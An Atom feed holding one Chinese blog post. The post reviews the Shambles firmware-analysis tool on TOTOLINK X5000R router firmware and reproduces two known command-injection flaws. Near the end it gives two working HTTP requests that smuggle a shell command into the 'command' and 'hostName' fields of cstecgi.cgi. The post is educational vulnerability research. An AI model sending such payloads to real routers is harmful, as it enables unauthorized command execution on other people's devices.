<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Blog</title>
  
  
  <link href="https://44maker.github.io/atom.xml" rel="self"/>
  
  <link href="https://44maker.github.io/"/>
  <updated>2023-09-02T01:44:20.526Z</updated>
  <id>https://44maker.github.io/</id>
  
  <author>
    <name>44maker</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Shambles初体验&amp;Totolink漏洞</title>
    <link href="https://44maker.github.io/2023/09/02/shambles-01/"/>
    <id>https://44maker.github.io/2023/09/02/shambles-01/</id>
    <published>2023-09-02T01:33:46.000Z</published>
    <updated>2023-09-02T01:44:20.526Z</updated>
    
    <content type="html"><![CDATA[<p>想找一个易上手、好看的UI、现代化的逆向工具，刷B站的时候看到了Shambles这个工具，便尝试使用一下。本篇文章主要介绍shambles上手体验以及Totolink漏洞复现及研究。</p><span id="more"></span><h1 id="Shambles初体验-Totolink漏洞"><a href="#Shambles初体验-Totolink漏洞" class="headerlink" title="Shambles初体验&amp;Totolink漏洞"></a>Shambles初体验&amp;Totolink漏洞</h1><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>想找一个易上手、好看的UI、现代化的逆向工具，刷B站的时候看到了Shambles这个工具，便尝试使用一下。本篇文章主要介绍shambles上手体验以及Totolink漏洞复现及研究。[ 作者水平有限，如有写错之处恳请指出]</p><h1 id="上手体验"><a href="#上手体验" class="headerlink" title="上手体验"></a>上手体验</h1><p>获得使用资格之后按照邮箱上的信息和授权码进行登录。[建议在良好的网络环境下使用]</p><div class="tag-plugin image"><div class="image-bg"><img src="https://telegraph-image-10r.pages.dev/file/99ef5f37938838b2e6133.png" fancybox="true"/></div></div><p>主页面分为本地和云端(上传)，本文先介绍上传云端的功能。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://telegraph-image-10r.pages.dev/file/b2b95a92aed6bf7852346.png" fancybox="true"/></div></div><p>点击上传并分析固件</p><p>本文所使用的固件信息:</p><p>厂商:totollink</p><p>型号:X5000R</p><p>大小:8.6MB</p><p>版本:V9.1.00u.6118</p><p>MD5:497788b96788270336160fec37d93660</p><p>指令集:MIPS</p><p>下载地址: <a href="https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/218/ids/36.html">https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/218/ids/36.html</a></p><div class="tag-plugin image"><div class="image-bg"><img src="https://telegraph-image-10r.pages.dev/file/37ee76fd8f6c67a4ec91d.png" fancybox="true"/></div></div><p>点击生成报告，输入固件信息，[注意只演示如何操作，本文固件已上传完毕，可以在本地文件列表查看]</p><div class="tag-plugin image"><div class="image-bg"><img src="https://telegraph-image-10r.pages.dev/file/7f2171b3107c7b12622b1.png" fancybox="true"/></div></div><p>完成后界面会恢复到上传前的样子，不用担心，点击左上角<strong>浏览所有</strong>即可看到刚刚上传的固件。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://telegraph-image-10r.pages.dev/file/8453f5476609f4c1c6291.png" fancybox="true"/></div></div><p>等待解包完成即可</p><div class="tag-plugin image"><div class="image-bg"><img src="https://telegraph-image-10r.pages.dev/file/6098465c91bf58c7957a3.png" fancybox="true"/></div></div><p>可以看到在云端固件列表中，已经有了分析报告[注意，目前shambles1.2.2版本在解包中可能由于有些字符串比较特殊或者比较多，打包的时候超出内存限制，导致解包出现错误]</p><p>486个高危31个中危，1825个低危，点击右侧的克隆至本地即可开始研究工作</p><p>点击左侧的本地文件</p><h2 id="工作窗口"><a href="#工作窗口" class="headerlink" title="工作窗口"></a>工作窗口</h2><p>工作窗口分为4大板块，分别是工具栏，文件树，固件信息（主面板），漏洞列表</p><div class="tag-plugin image"><div class="image-bg"><img src="https://telegraph-image-10r.pages.dev/file/e9071b3f1a9223d22d1ad.png" fancybox="true"/></div></div><p>同时还能够通过固件相似度可视化，发现相似固件，更方便于查找通杀漏洞</p><div class="tag-plugin image"><div class="image-bg"><img src="https://telegraph-image-10r.pages.dev/file/ecaff7e210dd51cfe06bd.png" fancybox="true"/></div></div><h2 id="Bindiff固件对比"><a href="#Bindiff固件对比" class="headerlink" title="Bindiff固件对比"></a>Bindiff固件对比</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://telegraph-image-10r.pages.dev/file/c8bbae4430f16b0b8d08e.png" fancybox="true"/></div></div><p>使用Bindiff功能就能对比两个固件的自动化对比，具体功能可以查看下面的视频进行学习</p><p><a href="https://www.bilibili.com/video/BV14V411V7ui/">https://www.bilibili.com/video/BV14V411V7ui/</a></p><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>当然，你还会注意到右侧的漏洞下还有虚拟机</p><p>[注：往常都是用QEMU来模拟环境进行测试，如果不知道如何用QEMU模拟环境可以查看这个视频</p><p><a href="https://boschko.ca/qemu-emulating-firmware/]">https://boschko.ca/qemu-emulating-firmware/]</a></p><p>没错！这个shambles还可以模拟固件环境，做到挖洞一站式体验</p><p>点击左上角的小箭头，切换到云端模式，再点击同步模拟器，等待ing</p><div class="tag-plugin image"><div class="image-bg"><img src="https://telegraph-image-10r.pages.dev/file/3985cacee270edf131e79.png" fancybox="true"/></div></div><p>具体的操作教程可以观看这个视频</p><p><a href="https://www.bilibili.com/video/BV18g4y1j7KX/">https://www.bilibili.com/video/BV18g4y1j7KX/</a></p><h2 id="挖洞"><a href="#挖洞" class="headerlink" title="挖洞"></a>挖洞</h2><p>那么最令人心动的就是漏洞列表板块了，shambles能够自动挖掘潜在漏洞的信息并十分清晰地列出</p><p>在右侧可以看到具有命令执行的函数漏洞，双击函数便可以定位，F5可以将汇编代码调整为便于我们阅读的类C语言模式</p><div class="tag-plugin image"><div class="image-bg"><img src="https://telegraph-image-10r.pages.dev/file/2502b5173b2938e0f7850.png" fancybox="true"/></div></div><p>使用chatgpt3.5也可以进行验证</p><div class="tag-plugin image"><div class="image-bg"><img src="https://telegraph-image-10r.pages.dev/file/3ff99a50e3b490798a6aa.png" fancybox="true"/></div></div><p>使用POC进行攻击</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/cstecgi.cgi HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">User-Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> (X11; Ubuntu; Linux x86_64; rv<span class="punctuation">:</span><span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">111.0</span></span><br><span class="line">Accept<span class="punctuation">:</span> application/json<span class="punctuation">,</span> text/javascript<span class="punctuation">,</span> *<span class="comment">/*; q=0.01</span></span><br><span class="line"><span class="comment">Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span></span><br><span class="line"><span class="comment">X-Requested-With: XMLHttpRequest</span></span><br><span class="line"><span class="comment">Content-Length: 82</span></span><br><span class="line"><span class="comment">Origin: http://192.168.0.1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://192.168.0.1/advance/traceroute.html?time=1679125513355</span></span><br><span class="line"><span class="comment">Cookie: SESSION_ID=2:1679122532:2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;command&quot;:&quot;127.0.0.1; pwd &gt; /tmp/1.txt;&quot;,&quot;num&quot;:&quot;4&quot;,&quot;topicurl&quot;:&quot;setTracerouteCfg&quot;&#125;</span></span><br></pre></td></tr></table></figure><p>同样再选择一个漏洞</p><p>在setOpModeCfg中包含命令插入漏洞，该漏洞允许攻击者通过“hostName”参数执行任意命令</p><div class="tag-plugin image"><div class="image-bg"><img src="https://telegraph-image-10r.pages.dev/file/b515dafdcd3c895dda3ef.png" fancybox="true"/></div></div><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/cstecgi.cgi HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">User-Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> (X11; Ubuntu; Linux x86_64; rv<span class="punctuation">:</span><span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">111.0</span></span><br><span class="line">Accept<span class="punctuation">:</span> application/json<span class="punctuation">,</span> text/javascript<span class="punctuation">,</span> *<span class="comment">/*; q=0.01</span></span><br><span class="line"><span class="comment">Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span></span><br><span class="line"><span class="comment">X-Requested-With: XMLHttpRequest</span></span><br><span class="line"><span class="comment">Content-Length: 90</span></span><br><span class="line"><span class="comment">Origin: http://192.168.0.1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://192.168.0.1/advance/time.html?time=1679126798322</span></span><br><span class="line"><span class="comment">Cookie: SESSION_ID=2:1679122532:2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">&quot;proto&quot;:&quot;1&quot;,</span></span><br><span class="line"><span class="comment">&quot;hostName&quot;:&quot;&#x27;; pwd &gt; /tmp/1.txt;&#x27; &quot;,</span></span><br><span class="line"><span class="comment">&quot;topicurl&quot;:&quot;setOpModeCfg&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>references:</p><ul><li>title: ‘TOTOLINK X5000R’<br>url: <a href="https://github.com/Kazamayc/vuln/tree/main/TOTOLINK/X5000R/">https://github.com/Kazamayc/vuln/tree/main/TOTOLINK/X5000R/</a></li></ul>]]></content>
    
    
    <summary type="html">一个次世代新型逆向工具</summary>
    
    
    
    <category term="渗透测试" scheme="https://44maker.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="工具体验" scheme="https://44maker.github.io/tags/%E5%B7%A5%E5%85%B7%E4%BD%93%E9%AA%8C/"/>
    
    <category term="渗透测试" scheme="https://44maker.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
